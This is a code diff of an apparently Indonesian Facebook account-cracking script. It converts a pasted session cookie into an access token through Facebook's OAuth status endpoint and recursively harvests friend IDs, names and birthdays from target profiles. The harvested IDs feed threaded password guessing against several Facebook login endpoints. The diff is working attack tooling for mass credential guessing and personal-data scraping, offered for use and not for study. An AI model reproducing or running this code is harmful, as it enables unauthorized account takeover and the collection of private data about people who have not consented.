@@ -908,51 +908,8 @@ def login():
     except IOError:
         login123()
 
-###-----[ BAGIAN LOGIN ]-----###
-def logincoki():
-	try:
-		cok = Console().input(f" {H2}• {P2}cookie : ")
-		open('.fancookie.txt', 'w').write(cok)
-		with requests.Session() as r:
-			try:
-				r.headers.update({
-					'Accept-Language': 'id,en;q=0.9',
-					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-					'Referer': 'https://www.instagram.com/',
-					'Host': 'www.facebook.com',
-					'Sec-Fetch-Mode': 'cors',
-					'Accept': '*/*',
-					'Connection': 'keep-alive',
-					'Sec-Fetch-Site': 'cross-site',
-					'Sec-Fetch-Dest': 'empty',
-					'Origin': 'https://www.instagram.com',
-					'Accept-Encoding': 'gzip, deflate',
-				})
-				response = r.get(
-					'https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/',
-					cookies={'cookie': cok}
-				)
-				if '"access_token":' in str(response.headers):
-					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
-					open('.fantoken.txt', 'w').write(token)
-					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
-				else:
-					Console().print(f" {H2}• {P2}[bold red]Cookie Invalid")
-					exit()
-			except Exception as e:
-				print(e)
-				exit()
-		Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
-		sleep(2)
-		exit()
-	except Exception as e:
-		os.system('rm -rf .fancookie.txt')
-		os.system('rm -rf .fantoken.txt')
-		print(e)
-		exit()
-
 # --------------------[ LOGIN-TOKEN-EAAB ]--------------#
-def logincokii():
+def logincoki():
     try:
         cok = Console().input(f" {H2}• {P2}cookie : ")
         cookie = {'cookie':cok}
@@ -1046,7 +1003,10 @@ def menu():
 [{color_text}05{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
     HaHi = console.input(f" {H2}• {P2}pilih menu : ")
     if HaHi in ["1", "01"]:
-        dump_publikk()
+        prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
+        idfac = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
+        dump_publikk(idfac,"",{"cookie":cookie},token)
+        setting()
     elif HaHi in ["2", "02"]:
         massal()
     elif HaHi in ["3", "03"]:
@@ -1059,46 +1019,23 @@ def menu():
     else:
     	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fanky ganteng ")
 
+
+
 #----------[ CRACK-PUBLIK  ]----------#
-def dump_publikk():
-    with requests.Session() as ses:
-        token = open(".fantoken.txt", "r").read()
-        cok = open(".fancookie.txt", "r").read()
-        prints(
-            Panel(
-                f"""{P2}masukan id target, pastikan id target bersifat publik""",
-                subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",
-                width=60,
-                style=f"{color_panel}",
-            )
-        )
-        a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
-        if a in ["me", "Me", "ME"]:
-            try:
-                koH = requests.get(
-                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
-                    cookies={"cookie": cok},
-                ).json()
-                for pi in koH["friends"]["data"]:
-                    try:
-                        id.append(pi["id"] + "|" + pi["name"])
-                    except:
-                        continue
-                setting()
-            except Exception as d:
-                print(d)
+def dump_publikk(idfac,fields,cookie,token):
+    try:
+        headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
+        if len(id)==0:
+            params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
         else:
-            try:
-                b = ses.get(
-                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
-                    cookies={"cookie": cok},
-                ).json()
-                for c in b["friends"]["data"]:
-                    id.append(c["id"] + "|" + c["name"])
-                setting()
-            except Exception as e:
-                print(e)
-                
+            params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
+        url = ses.get(f"https://graph.facebook.com/{idfac}", params=params, headers=headers, cookies=cookie).json()
+        for i in url["friends"]["data"]:
+            id.append(i["id"]+"|"+i["name"])
+            sys.stdout.write(f"\r • sedang dump id : {len(id)}")
+            sys.stdout.flush()
+        dump_publikk(idfac,url["friends"]["paging"]["cursors"]["after"],cookie,token)
+    except: pass
 # -------------------[ CRACK-Masal ]----------------#
 def massal():
     try:
@@ -1107,14 +1044,7 @@ def massal():
     except IOError:
         exit()
     try:
-        Console().print(
-            Panel(
-                "[bold white] Mau Berapa Target Yang Mau Di Crack",
-                width=60,
-                style=f"{color_panel}",
-                title="[bold green] Crack Masal [bold white]",
-            )
-        )
+        Console().print(Panel("[bold white] Mau Berapa Target Yang Mau Di Crack",width=60,style=f"{color_panel}",title="[bold green] Crack Masal [bold white]"))
         jum = int(input(f" • Masukan : "))
     except ValueError:
         Console().print(f" {H2}• {P2} Wrong input ")
@@ -1126,30 +1056,22 @@ def massal():
     yz = 0
     for met in range(jum):
         yz += 1
-        Console().print(
-            panel(
-                "[bold white] Masukkan Target ke " + str(yz) + "",
-                width=60,
-                style=f"{color_panel}",
-            )
-        )
+        Console().print(panel("[bold white] Masukkan Target ke " + str(yz) + "",width=60,style=f"{color_panel}"))
         kl = Console().input(f" {H2}• {P2}Masukan : ")
         uid.append(kl)
     for userr in uid:
         try:
-            col = ses.get(
-                f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",
-                cookies={"cookie": cok},
-            ).json()
-            for mi in col["friends"]["data"]:
-                try:
-                    iso = mi["id"] + "|" + mi["name"]
-                    if iso in id:
-                        pass
-                    else:
-                        id.append(iso)
-                except:
-                    continue
+            headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
+            if len(id)==0:
+                params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
+            # else:
+                # params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
+            url = ses.get(f"https://graph.facebook.com/{userr}", params=params, headers=headers, cookies=cok).json()
+            for i in url["friends"]["data"]:
+                id.append(i["id"]+"|"+i["name"])
+                sys.stdout.write(f"\r • sedang dump id : {len(id)}")
+                sys.stdout.flush()
+            # dump_publikk(userr,url["friends"]["paging"]["cursors"]["after"],cok,token)
         except (KeyError, IOError):
             pass
         except requests.exceptions.ConnectionError:
@@ -1159,10 +1081,10 @@ def massal():
         setting()
     except requests.exceptions.ConnectionError:
         print(f"")
-        print(" [+] Unstable Signal ")
+        Console().print(f" {H2}• {P2}Unstable Signal ")
         exit()
     except (KeyError, IOError):
-        print(f" [+] Pertemanan Tidak Public ")
+        Console().print(f" {H2}• {P2}Pertemanan Tidak Public ")
         time.sleep(3)
         exit()
 
@@ -1370,15 +1292,15 @@ def setting():
     Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]MTOUCH [bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]Touch[bold white] [/]\n{P2}[{color_text}04{P2}] Login Site [bold green]IP [bold white][[bold green]Recommended[bold white]][bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
     fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
     if fankylog in ["1", "01"]:
-    	method.append("fankygraph")
+        method.append("fankygraph")
     elif fankylog in ["2", "02"]:
-    	method.append("fankygraphv2")
+        method.append("fankygraphv2")
     elif fankylog in ["3", "03"]:
-    	method.append("fankywww")
+        method.append("fankywww")
     elif fankylog in ["4", "04"]:
-    	method.append("fankybapi")
+        method.append("fankybapi")
     else:
-    	method.append("fankygraph")  # Default metode
+        method.append("fankygraph")  # Default metode
     # Pengaturan User-Agent
     Console().print(Panel(
         f"[bold white]Apakah Anda Ingin Menggunakan UA Manual? Y/T",
@@ -1507,16 +1429,16 @@ def metslow():
                 else:
                     pass
                 if "fankygraph" in method:
-                	pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
+                    pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
                 elif "fankywww" in method:
-                	pool.submit(fankywww,idf,pwv)
+                    pool.submit(fankywww,idf,pwv)
                 elif "fankygraphv2" in method:
-                	pool.submit(fankytouch,idf,pwv)
+                    pool.submit(fankytouch,idf,pwv)
                 elif "fankybapi" in method:
-                	pool.submit(fanky_b_api,idf,pwv)
+                    pool.submit(fanky_b_api,idf,pwv)
                 else:
-                	pool.submit(fanky_b_api,idf,pwv)
-                
+                    pool.submit(fanky_b_api,idf,pwv)
+                                    
                 	
                 	
     print("")
@@ -1578,15 +1500,15 @@ def metcepat():
                         pwv.append(xpwd)
                 else:pass
                 if "fankygraph" in method:
-                	pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
+                    pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
                 elif "fankywww" in method:
-                	pool.submit(fankywww,idf,pwv)
+                    pool.submit(fankywww,idf,pwv)
                 elif "fankygraphv2" in method:
-                	pool.submit(fankytouch,idf,pwv)
+                    pool.submit(fankytouch,idf,pwv)
                 elif "fankybapi" in method:
-                	pool.submit(fanky_b_api,idf,pwv)
+                    pool.submit(fanky_b_api,idf,pwv)
                 else:
-                	pool.submit(fanky_b_api,idf,pwv)
+                    pool.submit(fanky_b_api,idf,pwv)
  
     print("")
     Console().print(
